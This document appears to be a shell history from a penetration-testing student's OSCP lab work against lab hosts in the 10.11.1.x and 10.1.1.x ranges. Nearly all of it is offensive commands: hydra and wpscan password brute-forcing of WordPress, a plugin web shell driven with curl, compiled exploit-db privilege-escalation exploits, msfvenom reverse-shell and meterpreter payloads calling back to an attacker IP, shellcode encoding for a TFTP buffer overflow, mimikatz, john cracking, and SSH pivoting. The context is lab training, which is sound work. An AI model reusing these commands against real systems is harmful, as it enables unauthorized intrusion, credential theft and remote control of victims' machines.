 2714  2020-09-15 21:25  hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 80 -o "/home/kali/OSCP/results/10.11.1.234/scans/tcp_80_http_form_hydra.txt" http-post-form://http://10.11.1.234/wp-login.php:username=^USER^&password=^PASS^:invalid-login-message\n
 2715  2020-09-15 21:25  hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 80 -o "/home/kali/OSCP/results/10.11.1.234/scans/tcp_80_http_form_hydra.txt" http-post-form://10.11.1.234/wp-login.php:username=^USER^&password=^PASS^:invalid-login-message\n
 2716  2020-09-15 21:26  nmap -sCV 10.11.1.234 -p- -oA nmapFullScan\n[6:41 AM]\n
 2717  2020-09-15 21:26  nmap -sCV 10.11.1.234 -p- -oA nmapFullScan
 2718  2020-09-15 21:53  wpscan --url http://10.11.1.234/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames admin --max-threads 50
 2719  2020-09-15 23:33  cd /usr/share/seclists/web-shells/wordpress 
 2720  2020-09-15 23:33  cd /usr/share/seclists/
 2721  2020-09-15 23:33  cd Web-Shells
 2722  2020-09-15 23:33  cd WordPress
 2723  2020-09-15 23:38  cp plugin-shell.php ~/OSCP/results/10.11.1.234
 2724  2020-09-15 23:39  cd ~/OSCP/results/10.11.1.234 \n
 2725  2020-09-15 23:39  mv plugin-shell.php exploit
 2726  2020-09-15 23:44  curl http://10.11.1.234/wp-content/plugins/plugin-shell/plugin-shell.php\?cmd\=whoami
 2727  2020-09-15 23:45  curl http://10.11.1.234/wp-content/plugins/plugin-shell/plugin-shell.php\?cmd=whoami
 2728  2020-09-15 23:45  curl http://10.11.1.234/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
 2729  2020-09-15 23:47  curl http://10.11.1.234/wp-content/plugins/plugin-shell/plugin-shell.php
 2730  2020-09-15 23:47  curl http://10.11.1.234/wp-content/plugins/plugin-shell/plugin-shell.php\?cmd
 2731  2020-09-15 23:47  curl http://10.11.1.234/wp-content/plugins/plugin-shell/plugin-shell.php?cmd
 2732  2020-09-15 23:47  curl http://10.11.1.234/wp-content/plugins/plugin-shell/plugin-shell.php?cmd\=ls
 2733  2020-09-15 23:47  curl http://10.11.1.234/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=ls
 2734  2020-09-16 00:29  touch wp-rshell.php
 2735  2020-09-16 00:30  sudo zip rshell.zip wp-rshell.php
 2736  2020-09-16 00:34  sudo cp ~/Downloads/CTF_template.ctb ./
 2737  2020-09-16 00:34  sudo chown kali.kali CTF_template.ctb
 2738  2020-09-16 00:39  lcd 10.11.1.234
 2739  2020-09-16 01:07  searchsploit    Ubuntu 10.04 LTS\n
 2740  2020-09-16 01:08  vim /usr/share/exploitdb/exploits/linux/local/14273.sh
 2741  2020-09-16 01:10  vim /usr/share/exploitdb/exploits/linux/local/15074.sh
 2742  2020-09-16 01:15  vim 15074.sh
 2743  2020-09-16 01:16  locate / | grep linux/local/14273.sh
 2744  2020-09-16 01:16  cp /usr/share/exploitdb/exploits/linux/local/14273.sh ./
 2745  2020-09-16 01:18  locate / | grep linux/local/41760.txt
 2746  2020-09-16 01:18  vim /usr/share/exploitdb/exploits/linux/local/41760.txt
 2747  2020-09-16 01:19  locate / | grep linux/local/15074.sh
 2748  2020-09-16 01:19  cp /usr/share/exploitdb/exploits/linux/local/15074.sh ./
 2749  2020-09-16 01:23  touch UserNamespacesExec.c
 2750  2020-09-16 01:23  vim UserNamespacesExec.c
 2751  2020-09-16 01:24  gcc UserNamespacesExec.c -o lol
 2752  2020-09-16 02:01  cd linPEAS/
 2753  2020-09-16 06:50  stat 
 2754  2020-09-16 06:50  find /home/daygeek/ -type d -mmin -30 -ls
 2755  2020-09-16 06:50  find /home/kali/ -type d -mmin -30 -ls
 2756  2020-09-16 07:20  # find /home/daygeek/shell-script -type f -ctime -1 -ls\n
 2757  2020-09-16 07:21  # find /home/kali -type f -ctime -1 -ls\n
 2758  2020-09-16 07:58  mysql -h 10.11.1.31 -P 1433 -u wordpress
 2759  2020-09-16 07:59  mysql -h 10.11.1.31 -P 3306 -u wordpress
 2760  2020-09-16 07:59  mysql -h 10.11.1.234 -P 3306 -u wordpress
 2761  2020-09-16 07:59  mysql -h 10.11.1.234 -P 3306 -u 
 2762  2020-09-16 07:59  mysql -h 10.11.1.234 -P 3306 
 2763  2020-09-16 07:59  mysql -h 10.11.1.234 -P 3306 -u wordpress -p wordpress12345
 2764  2020-09-16 08:00  mysql -h 10.11.1.234 -P 3306 -u wordpress -p 
 2765  2020-09-16 08:03  locate / | grep linux/local/15704.c
 2766  2020-09-16 08:04  cp /usr/share/exploitdb/exploits/linux/local/15704.c ./
 2767  2020-09-16 08:04  gcc 15704.c
 2768  2020-09-16 08:04  gcc full-nelson.c -o full-nelson\n
 2769  2020-09-16 08:07  gcc 15704.c -o full-nelson\n
 2770  2020-09-16 08:07  vim 15704.c
 2771  2020-09-16 08:11  searchsploit    Ubuntu 10.04\n
 2772  2020-09-16 08:11  lcoate / | grep linux/local/17787.c
 2773  2020-09-16 08:12  locate / | grep linux/local/17787.c
 2774  2020-09-16 08:12  gcc 17787.c
 2775  2020-09-16 08:12  vim 17787.c
 2776  2020-09-16 08:12  gcc half-nelson.c -o half-nelson -lrt\n
 2777  2020-09-16 08:12  gcc 17787.c -o half-nelson -lrt\n
 2778  2020-09-16 08:14  cp /usr/share/exploitdb/exploits/linux/local/17787.c ./
 2779  2020-09-16 08:14  searchsploit  full nelson
 2780  2020-09-16 19:25  cherretree offsec.ctb
 2781  2020-09-16 19:25  cherrytree offsec.ctb
 2782  2020-09-16 19:26  cd /usr/share/exploitdb/exploits/linux/local/40839.c
 2783  2020-09-16 19:26  cp /usr/share/exploitdb/exploits/linux/local/40839.c ./
 2784  2020-09-16 19:31  d report
 2785  2020-09-16 19:52  cd 10.11.1.237
 2786  2020-09-16 19:52  cd 10.11.1.234
 2787  2020-09-16 19:53  vim wp-rshell.php
 2788  2020-09-16 19:53  lcd
 2789  2020-09-16 20:07  cd it_dept/results/10.1.1.223
 2790  2020-09-16 20:08  locate . |grep 33070.py 
 2791  2020-09-16 20:08  locate /  | grep 33070.py 
 2792  2020-09-16 20:08  cp /home/kali/OSCP/results/10.11.1.223/exploit/33070.py
 2793  2020-09-16 20:08  cp /home/kali/OSCP/results/10.11.1.223/exploit/33070.py ./
 2794  2020-09-16 20:08  python 33070.py http://10.1.1.223/index.php 
 2795  2020-09-16 20:19  http://10.1.1.1/
 2796  2020-09-16 20:32  curl http://10.1.1.1/
 2797  2020-09-16 20:35  X-Forwarded-For
 2798  2020-09-16 22:16  #nc -nv 10.11.1.231 9931\n
 2799  2020-09-16 22:17  c -nv 10.11.1.231 9931\npython -c 'import pty; pty.spawn("/bin/bash")'
 2800  2020-09-16 22:28  sudo python -m SimpleHTTPServer 80u
 2801  2020-09-16 23:05  d it_dept
 2802  2020-09-16 23:06  mkdir 10.1.1.1
 2803  2020-09-16 23:06  mkdir loot
 2804  2020-09-16 23:29  ssh luigi@10.1.1.1
 2805  2020-09-16 23:42  cd Downloads/l
 2806  2020-09-16 23:42  cd LinEnum
 2807  2020-09-17 04:42  cd ~/OSCP/results/10.11.1.231/report
 2808  2020-09-17 04:42  cd 10.11.1.231
 2809  2020-09-17 04:43  cherrytree mailmen.ctb
 2810  2020-09-17 05:43  msf -q
 2811  2020-09-17 19:44  cd scq
 2812  2020-09-17 19:45  cat _commands.log 
 2813  2020-09-17 19:53  ''
 2814  2020-09-17 19:54  touch lol.sh
 2815  2020-09-17 19:54  vim lol.sh
 2816  2020-09-17 20:29  git commit -m "finished luigi"
 2817  2020-09-17 20:53  cat nmap
 2818  2020-09-17 20:56  git touch tftp.py
 2819  2020-09-17 20:56  touch tft.py
 2820  2020-09-17 21:28  vim exploit_payload
 2821  2020-09-17 21:39  cat stack_adjustment exploit_payload > adjusted_shellcode\n
 2822  2020-09-17 21:41  rm adjusted_shellcode
 2823  2020-09-17 21:46  cat exploit_payload
 2824  2020-09-17 21:47  cat stack_adjustment
 2825  2020-09-17 21:47  vim stack_adjustment
 2826  2020-09-17 21:48  rm exploit_payload
 2827  2020-09-17 21:48  rm stack_adjustment
 2828  2020-09-17 21:48  msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=192.168.119.217 LPORT=443 -f raw -o exploit_payload
 2829  2020-09-17 21:49  echo -en "\x81\xec\xac\x0d\x00\x00" > stack_adjustment\n
 2830  2020-09-17 21:49  cat stack_adjustment exploit_payload > adjusted_shellcode
 2831  2020-09-17 21:49  cat adjusted_payload | msfvenom -p - -b "\x00" -a x86 --platform Windows -f python\n
 2832  2020-09-17 22:02  cat adjusted_shellcode
 2833  2020-09-17 22:02  strings adjusted_shellcode
 2834  2020-09-17 22:05  python atftp_19.py 192.168.119.217 10.11.1.226  69
 2835  2020-09-17 22:05  python tft.py 192.168.119.217 10.11.1.226  69
 2836  2020-09-18 00:08  rm 'C:\Users\Administrator\Desktop\.proof.txt' C:\\Users\\Administrator\\Desktop\\proof.txt
 2837  2020-09-18 00:10  locate / | grep windows/remote/2887.pl
 2838  2020-09-18 00:13  cp /usr/share/exploitdb/exploits/windows/remote/2887.pl\n
 2839  2020-09-18 00:13  cp /usr/share/exploitdb/exploits/windows/remote/2887.pl ./
 2840  2020-09-18 00:14  perl 2887.pl
 2841  2020-09-18 00:18  vim 2887.pl
 2842  2020-09-18 00:19  perl 2887.pl 10.11.1.226 69
 2843  2020-09-18 00:19  searchsploit  AT-TFTP Server 1.9
 2844  2020-09-18 00:37  nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN "/home/kali/OSCP/results/10.11.1.226/scans/_full_tcp_nmap.txt" -oX "/home/kali/OSCP/results/10.11.1.226/scans/xml/_full_tcp_nmap.xml" 10.11.1.226\n
 2845  2020-09-18 00:50  cat payload
 2846  2020-09-18 00:50  string payload
 2847  2020-09-18 00:50  strings payload
 2848  2020-09-18 00:51  perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj
 2849  2020-09-18 00:51  cat stack
 2850  2020-09-18 00:51  cat stackadj
 2851  2020-09-18 00:51  vim stackadj
 2852  2020-09-18 00:53  vim shellcode
 2853  2020-09-18 00:53  hexdump -C shellcode
 2854  2020-09-18 00:54  cat shellcode | msfvenom -p - -b \x00 -a x86 --platform Windows -e x86/shikata_ga_nai -f python
 2855  2020-09-18 00:55  python tft.py
 2856  2020-09-18 00:55  python3 tft.py
 2857  2020-09-18 00:55  python tft.py 10.11.1.226
 2858  2020-09-18 00:56  python tft.py 10.11.1.226 69
 2859  2020-09-18 01:05  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 prependmigrate=true prepenmigrateprocess=explorer.exe EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
 2860  2020-09-18 01:08  cat tft.py
 2861  2020-09-18 01:09  msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=192.168.193.17 LPORT=443 prependmigrate=true prepenmigrateprocess=explorer.exe -a x86 --platform Windows -f raw -o payload
 2862  2020-09-18 01:10  perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj\n
 2863  2020-09-18 01:10  cat stackadj payload > shellcode
 2864  2020-09-18 01:10  hexdump -C shellcode\n
 2865  2020-09-18 01:11  cat shellcode | msfvenom -p - -b \x00 -a x86 --platform Windows -e x86/shikata_ga_nai -f python\n
 2866  2020-09-18 01:51  p
 2867  2020-09-18 02:04  python tft.py 10.11.1.226 69 192.168.119.217
 2868  2020-09-18 02:05  vim tft.py
 2869  2020-09-18 08:35  searchsploit tftp
 2870  2020-09-18 08:38  nmap -sV -sC -sU -p 69 10.11.1.226
 2871  2020-09-18 08:43  cd OSCP/l\\n
 2872  2020-09-18 08:43  cd OSCP/\n
 2873  2020-09-18 08:44  sudo nmap -sV -sC -sU -p 69 10.11.1.226
 2874  2020-09-18 08:44  ping 10.11.1.222
 2875  2020-09-18 08:46  ping 10.11.1.226
 2876  2020-09-18 08:46  ping 10.11.1.227
 2877  2020-09-18 08:46  ping 10.11.1.228
 2878  2020-09-18 08:46  ping 10.11.1.224
 2879  2020-09-18 08:46  ping 10.11.1.223
 2880  2020-09-18 08:46  ping 10.11.1.229
 2881  2020-09-18 08:48  sudo nmap -vv --reason -Pn -sU -sV -p 69 --script=banner,tftp-enum
 2882  2020-09-18 08:48  sudo nmap -vv --reason -Pn -sU -sV -p 69 --script=banner,tftp-enum 10.11.1.226
 2883  2020-09-18 08:53  mkdir 10.1.1.31
 2884  2020-09-18 08:54  touch nmaptcp.txt
 2885  2020-09-18 08:54  vim nmaptcp.txt
 2886  2020-09-18 08:58  mkdir 10.1.1.235
 2887  2020-09-18 08:59  touch nmapstcp.txt
 2888  2020-09-18 09:03  vim boot.ini
 2889  2020-09-18 09:07  mkdir 10.1.1.254
 2890  2020-09-18 09:07  mkdir scans 
 2891  2020-09-18 09:07  touch nmapstcp
 2892  2020-09-18 09:08  vim nmapstcp
 2893  2020-09-18 09:23  vim .\\..\\..\\..\\..\\..\\..\\boot.ini
 2894  2020-09-18 09:23  ss
 2895  2020-09-18 09:26  atftp 10.11.1.226
 2896  2020-09-18 09:54  cd OSCP/results/10.11.1.226/exploit
 2897  2020-09-18 09:54  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.217 LPORT=8080  -f exe > rev.exe
 2898  2020-09-18 09:55  ls -la
 2899  2020-09-18 10:58  cdcd ..
 2900  2020-09-18 11:00  cat eula.txt
 2901  2020-09-18 11:36  cherrytree joe.ctb
 2902  2020-09-18 22:08  cd 10.1.1.223
 2903  2020-09-18 22:09  cd 10.1.1.254
 2904  2020-09-18 22:09  cd ss
 2905  2020-09-18 22:09  cat nmapstcp
 2906  2020-09-18 22:14  curl https://10.1.1.254/
 2907  2020-09-18 22:15  locate / | grep php/webapps/47413.py
 2908  2020-09-18 22:15  cp /usr/share/exploitdb/exploits/php/webapps/47413.py ./
 2909  2020-09-18 22:16  vim 47413.py
 2910  2020-09-18 22:17  python 47413.py
 2911  2020-09-18 22:18  searchsploit pfSense
 2912  2020-09-18 22:18  locate / | grep php/webapps/39038.txt
 2913  2020-09-18 22:19  vim /usr/share/exploitdb/exploits/php/webapps/39038.txt
 2914  2020-09-18 22:21  locate / | grep php/webapps/36506.txt
 2915  2020-09-18 22:21  vim /usr/share/exploitdb/exploits/php/webapps/36506.txt
 2916  2020-09-18 23:25  cd rse
 2917  2020-09-18 23:30  autorecon 10.11.1.250
 2918  2020-09-18 23:48  cd OSCP/l
 2919  2020-09-18 23:50  l\\nl
 2920  2020-09-18 23:50  touch passwords.txt
 2921  2020-09-19 00:02  find / | grep beef
 2922  2020-09-19 00:03  find / | grep beef 2>/dev/null \;
 2923  2020-09-19 00:04  find / | grep beef 2>/dev/null 
 2924  2020-09-19 00:04  locate / | grep beef 
 2925  2020-09-19 00:06  sudo apt install beef
 2926  2020-09-19 00:07  cd 10.11.1.250
 2927  2020-09-19 00:07  sudo -ssudo apt install seclists
 2928  2020-09-19 00:07  beef-xxs
 2929  2020-09-19 00:08  beef-xss
 2930  2020-09-19 00:08  $ sudo beef-xss
 2931  2020-09-19 00:08  beef- h
 2932  2020-09-19 00:08  beef -h
 2933  2020-09-19 00:27  \curl -sSL https://get.rvm.io | bash -s -- --autolibs=install-packages
 2934  2020-09-19 00:28  sudo .rvm/bin/rvm requirements
 2935  2020-09-19 00:30  \curl -sSL https://get.rvm.io | bash -s stable --ruby
 2936  2020-09-19 00:31  git clone https://github.com/beefproject/beef.git
 2937  2020-09-19 00:32  ./install
 2938  2020-09-19 00:43  find / | grep 2 > /dev/null
 2939  2020-09-19 00:43  find / | grep 2>/dev/null
 2940  2020-09-19 00:47  git commit -m "finished .26 BOF"
 2941  2020-09-19 00:51  curl http://10.11.1.234:10443/nina.html
 2942  2020-09-19 01:16  sudo wget https://github.com/Valve/fingerprintjs2/archive/mas\nter.zip
 2943  2020-09-19 01:16  sudo wget https://github.com/Valve/fingerprintjs2/archive/master.zip\nter.zip
 2944  2020-09-19 01:16  sudo wget https://github.com/Valve/fingerprintjs2/archive/master.zip
 2945  2020-09-19 01:17  mkdir fingerprint
 2946  2020-09-19 01:17  cp ../master.zip ./
 2947  2020-09-19 01:18  rm master.zip
 2948  2020-09-19 01:18  cd fingerprint
 2949  2020-09-19 01:18  sudo unzip master.zip
 2950  2020-09-19 01:18  sudo mv fingerprintjs2-master/ fp
 2951  2020-09-19 01:18  cd fingerprintjs-master
 2952  2020-09-19 01:19  cat fingerprint2.js
 2953  2020-09-19 01:19  vim fingerprint2.js
 2954  2020-09-19 01:20  cd flash
 2955  2020-09-19 01:20  cd compiled
 2956  2020-09-19 01:20  vim index.html
 2957  2020-09-19 03:34  searchsploit Microsoft Internet Explorer 7 
 2958  2020-09-19 03:49  msfvenom -h
 2959  2020-09-19 03:51  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
 2960  2020-09-19 04:35  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f hta-psh -o evil.hta
 2961  2020-09-19 04:35  ca evil.hta
 2962  2020-09-19 04:39  locate / | grep 
 2963  2020-09-19 04:39  locate / | grep Microsoft Internet Explorer 7 - Memory Corruption 
 2964  2020-09-19 04:39  locate / | grep 8080
 2965  2020-09-19 04:39  vim /usr/share/exploitdb/exploits/windows/dos/28080.py
 2966  2020-09-19 04:40  vim /usr/share/exploitdb/exploits/windows/remote/8080.py
 2967  2020-09-19 04:42  cd results/10.1.1.235
 2968  2020-09-19 04:42  cp /usr/share/exploitdb/exploits/windows/remote/8080.py ./
 2969  2020-09-19 04:42  python 8080.py
 2970  2020-09-19 04:43  vim 8080.py
 2971  2020-09-19 04:43  sudo python 8080.py
 2972  2020-09-19 04:56  scp evil.hta offsec@10.11.1.234:~
 2973  2020-09-19 05:46  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f hta-psh -o evil.htau
 2974  2020-09-19 22:14  c results
 2975  2020-09-19 22:14  touch hook.js
 2976  2020-09-19 22:14  vim hook.js
 2977  2020-09-20 03:44  ssh offsec@10.11.1.234
 2978  2020-09-20 04:01  locate / | grep winPEAS.sln 
 2979  2020-09-20 04:01  locate / | grep winPEAS.exe
 2980  2020-09-20 04:02  cd /home/kali/Downloads/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/Release/Dotfuscated/
 2981  2020-09-20 04:16  locate / | grep MS11-046
 2982  2020-09-20 04:17  locate / | grep 40564
 2983  2020-09-20 04:17  vim /usr/share/exploitdb/exploits/windows_x86/local/40564.c
 2984  2020-09-20 04:17  cp /usr/share/exploitdb/exploits/windows_x86/local/40564.c ./
 2985  2020-09-20 04:17  vim 40564.c
 2986  2020-09-20 04:18  i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32\n
 2987  2020-09-20 04:18  i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32\n
 2988  2020-09-20 05:22  cd /home/kali/OSCP/results/10.11.1.222/exploit/
 2989  2020-09-20 05:29  cd ~/OSCP/it_dept/results/10.1.1.235/exploit 
 2990  2020-09-20 05:32  cd ~/OSCP/it_dept/results/10.1.1.235
 2991  2020-09-20 05:32  cp ~/Downloads/mimikatz_trunk.zip ./
 2992  2020-09-20 05:34  cd Win32
 2993  2020-09-20 05:37  cd /usr/share/windows-resources/mimikatz
 2994  2020-09-20 05:37  cd /usr/share/responder/tools/MultiRelay/bin/mimikatz_x86.exe
 2995  2020-09-20 05:37  cd /usr/share/responder/tools/MultiRelay/bin/
 2996  2020-09-20 05:38  cp mimikatz_x86.exe ~/OSCP/it_dept/results/10.1.1.235/exploit
 2997  2020-09-20 05:38  cd ~/OSCP/it_dept/results/10.1.1.235/exploit
 2998  2020-09-20 05:52  vim pass.txt
 2999  2020-09-20 05:52  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt ninapass.txt
 3000  2020-09-20 05:55  /usr/sbin/john --format=LM --rules -w=/usr/share/wordlists/rockyou.txt nativehashalice.txt
 3001  2020-09-20 05:55  /usr/sbin/john --format=LM --rules -w=/usr/share/wordlists/rockyou.txt ninapass.txt
 3002  2020-09-20 06:03  git commit -m "finished nina in itdept"
 3003  2020-09-20 06:00  rdesktop -u nina 10.1.1.235
 3004  2020-09-20 08:31  scd it_dept
 3005  2020-09-20 08:31  lcd 10.1.1.235
 3006  2020-09-20 08:32  cherrytree ninadone.ctb
 3007  2020-09-20 08:36  touch carriesdetails
 3008  2020-09-20 08:36  vim carriesdetails
 3009  2020-09-20 08:37  cat nmaptcp.txt
 3010  2020-09-20 09:09  rdesktop -u carrie 10.1.1.236
 3011  2020-09-20 09:11  ssh carrie10.1.1.356
 3012  2020-09-20 09:12  ssh carrie10.1.1.236
 3013  2020-09-20 09:23  curl http://10.11.1.234/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=lsu
 3014  2020-09-20 09:29  ssh carrie@10.1.1.236
 3015  2020-09-20 09:29  smbclient -L \\10.1.1.236
 3016  2020-09-20 09:46  curl http://10.1.1.236:3389/
 3017  2020-09-20 09:55  cd cd privilege-escalation-awesome-scripts-suite
 3018  2020-09-20 19:29  cd it_dept/results/1
 3019  2020-09-20 19:30  mkdir 10.1.1.236
 3020  2020-09-20 19:30  cp carriesdetails ../../10.1.1.236
 3021  2020-09-20 19:30  ssh carrie@10.1.1.236 -p 222\n
 3022  2020-09-20 19:34  ced it_dept
 3023  2020-09-20 19:34  mkdir passwords
 3024  2020-09-20 19:34  mv carriesdetails passwords
 3025  2020-09-20 19:36  cd it_dept/results/
 3026  2020-09-20 19:36  cd 10.1.1.236
 3027  2020-09-20 19:37  cd passwords
 3028  2020-09-20 19:37  cat c
 3029  2020-09-20 19:37  cat carriesdetails
 3030  2020-09-20 19:41  git commit -m "finishec arrie"
 3031  2020-09-20 19:44  cd it_dept/results/10.1.1.
 3032  2020-09-20 19:44  cd it_dept/results/10.1.1.1
 3033  2020-09-20 19:47  cd k
 3034  2020-09-20 19:47  cd l
 3035  2020-09-20 19:48  cat aps
 3036  2020-09-20 19:48  cat pas
 3037  2020-09-20 19:48  cat passwords.txt 
 3038  2020-09-20 19:48  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt passwords.txt
 3039  2020-09-20 19:49  unshadow
 3040  2020-09-20 19:50  sudo apt install unshadow
 3041  2020-09-20 19:50  locate / | grep unshadow
 3042  2020-09-20 19:51  /usr/sbin/unshadow passwords.txt
 3043  2020-09-20 19:52  /usr/sbin/unshadow passwords.txt passwords.txt > unshadowpass.txt
 3044  2020-09-20 19:52  cat passwords.txt
 3045  2020-09-20 19:52  /usr/sbin/unshadow  passwords.txt > unshadowpass.txt
 3046  2020-09-20 19:52  cat unshadowpass.txt
 3047  2020-09-20 19:54  /usr/sbin/unshadow  unshadowpass.txt passwords.txt
 3048  2020-09-20 19:54  vim passwords.txt
 3049  2020-09-20 19:54  /usr/sbin/unshadow  passwords.txt  unshadowpass.txt
 3050  2020-09-20 20:00  touch passwd
 3051  2020-09-20 20:00  vim passw
 3052  2020-09-20 20:01  /usr/sbin/unshadow  passw  unshadowpass.txt
 3053  2020-09-20 20:01  vim unshadowpass.txt
 3054  2020-09-20 20:01  /usr/sbin/unshadow  passwd  unshadowpass.txt
 3055  2020-09-20 20:02  sudo /usr/sbin/unshadow  passwd  unshadowpass.txt > lol
 3056  2020-09-20 20:02  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt lol
 3057  2020-09-20 20:16  cd beef
 3058  2020-09-20 20:19  cast config.yaml
 3059  2020-09-20 20:19  cat config.yaml
 3060  2020-09-20 20:19  ./beef
 3061  2020-09-20 20:20  sudo ./beef
 3062  2020-09-20 20:23  ./update-beef
 3063  2020-09-20 20:23  ./update-geoipdb
 3064  2020-09-20 20:23  sudo ./update-geoipdb
 3065  2020-09-20 20:26  vim config.yaml
 3066  2020-09-20 20:35  ssh mario@10.1.1.1
 3067  2020-09-20 21:29  touch chrispass.txt
 3068  2020-09-20 21:29  cat  af636dea707fa9cf431562c90e8a4044 >> chrispass.txt
 3069  2020-09-20 21:29  echo  af636dea707fa9cf431562c90e8a4044 >> chrispass.txt
 3070  2020-09-20 21:43  git clone https://github.com/Screetsec/TheFatRat.git\n
 3071  2020-09-20 21:45  cd TheFatRat\n
 3072  2020-09-20 21:45  chmod +x setup.sh && ./setup.sh\n
 3073  2020-09-20 21:45  sudo chmod +x setup.sh && ./setup.sh\n
 3074  2020-09-20 23:51  smbmap-share-permissions.txt
 3075  2020-09-20 23:53  cd loots
 3076  2020-09-20 23:56  autorecon 10.11.1.118
 3077  2020-09-20 23:57  cd 10.11.1.226
 3078  2020-09-21 00:50  cat _
 3079  2020-09-21 01:01  msfvenom  -p  windows/x86/meterpreter/reverse_tcp  lhost=192.168.119.217 lport=443  -f hta-psh -o meterpreter.hta
 3080  2020-09-21 01:10  ssmtp  
 3081  2020-09-21 01:26  ssmtp
 3082  2020-09-21 01:26  ssmrtp
 3083  2020-09-21 01:28  nmap 10.11.1.252
 3084  2020-09-21 01:32  searchsploit timeclock
 3085  2020-09-21 01:33  locate / |  grep php/webapps/39427.txt
 3086  2020-09-21 01:34  vim /usr/share/exploitdb/exploits/php/webapps/39427.txt
 3087  2020-09-21 01:35  locate / |  grep php/webapps/39404.txt
 3088  2020-09-21 01:35  vim /usr/share/exploitdb/exploits/php/webapps/39404.txt
 3089  2020-09-21 02:00  mkdir 10.11.1.252
 3090  2020-09-21 02:00  cd 10.11.1.
 3091  2020-09-21 02:02  python lol.py 10.11.1.252 8000
 3092  2020-09-21 02:28  ssh j0hn@10.11.1.252
 3093  2020-09-21 03:55  nmap -Pn 10.11.1.252
 3094  2020-09-21 03:56  locate / | grep php/webapps/11516.html
 3095  2020-09-21 03:57  vim /usr/share/exploitdb/exploits/php/webapps/11516.html
 3096  2020-09-21 04:10  searchsploit timeclock\n
 3097  2020-09-21 04:16  nmap -sCVPn 10.11.1.252 -p- -oA nmapFullScan
 3098  2020-09-21 04:16  nmap -sCVPn 10.11.1.252 -p- -oA 
 3099  2020-09-21 04:17  nmap -sCVPn 10.11.1.252 -p- -oA lol
 3100  2020-09-21 04:17  nmap -sCVPn 10.11.1.252  -oA 
 3101  2020-09-21 04:17  nmap -sCVPn 10.11.1.252  
 3102  2020-09-21 04:17  nmap -sCV -Pn 10.11.1.252  
 3103  2020-09-21 04:20  nmap -sCVA -Pn 10.11.1.252  
 3104  2020-09-21 04:38  cd privilege-escalation-awesome-scripts-suite/linPEAS
 3105  2020-09-21 07:09  cd it_dept/results/10.1.1.27
 3106  2020-09-21 07:27  c eres
 3107  2020-09-21 07:27  cherrytree p
 3108  2020-09-21 07:31  penssl passwd -1 -salt hack pass123
 3109  2020-09-21 07:31  openssl passwd -1 -salt hack pass123
 3110  2020-09-21 07:38  ssh hack@10.11.1.252 -p 22000
 3111  2020-09-21 07:42  nmap -sCV -p- -Pn 10.11.1.252  
 3112  2020-09-21 07:52  serachsploit timeclock-software\n
 3113  2020-09-21 07:52  searchsploit timeclock-software\n
 3114  2020-09-21 07:52  searchsploit time\n
 3115  2020-09-21 07:54  cd OSCP/results
 3116  2020-09-21 07:59  git commit -m "fininshed timeclock and got dev subnet"
 3117  2020-09-21 09:15  mkdir dev_dept
 3118  2020-09-21 09:42  mkdir 10.3.3.31
 3119  2020-09-21 09:42  touch .31
 3120  2020-09-21 09:42  rm -rf .31
 3121  2020-09-21 09:42  touch 31
 3122  2020-09-21 09:42  vim 31
 3123  2020-09-21 19:23  #ssh tom@10.11.1.252 -p 22000
 3124  2020-09-21 19:23  sshuttle -r  tom@10.11.1.252 -p 22000  10.2.2.1/24
 3125  2020-09-21 19:24  sshuttle -r  tom@10.11.1.252:22000  10.2.2.1/24
 3126  2020-09-21 19:25  ssh tom@10.11.1.252 -p 22000
 3127  2020-09-21 19:44  sshuttle -r  j0hn@10.11.1.252 22000  10.2.2.1/24
 3128  2020-09-21 19:44  sshuttle
 3129  2020-09-21 19:46  sudo apt update sshuttle
 3130  2020-09-21 19:48  sshuttle -r  j0hn@10.11.1.252:22000  10.2.2.1/24  --python=/usr/local/bin/python3
 3131  2020-09-21 19:49  /usr/local/bin/python3\n
 3132  2020-09-21 19:49  which python3
 3133  2020-09-21 19:51  ping 10.2.2.31
 3134  2020-09-21 19:59  ssh -N -D 127.0.0.1:8080 -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc j0hn@10.11.1.252 -p 22000
 3135  2020-09-21 20:08  ssh -L 8080:127.0.0.1:22000j0hn@10.11.1.252 -p 22000
 3136  2020-09-21 20:08  ssh -L 8080:127.0.0.1:22000 j0hn@10.11.1.252 -p 22000
 3137  2020-09-21 20:33  sendmail
 3138  2020-09-21 20:33  sudo apt install ssmtp
 3139  2020-09-21 20:34  sudo apt install sendmail
 3140  2020-09-21 20:47  cd re
 3141  2020-09-21 20:50  msfvenom  -p  windows/meterpreter/reverse_tcp  lhost=192.168.119.217 lport=443  -f hta-psh -o meterpreter.hta
 3142  2020-09-21 20:56  gf
 3143  2020-09-21 20:56  GF
 3144  2020-09-21 21:00  ssh -N
 3145  2020-09-21 21:01  proxychains ssh   -v -N -D 9050 j0hn@10.11.1.252 -p 22000 
 3146  2020-09-21 22:08  cat ../dev_dept/10.3.3.31/scans/31
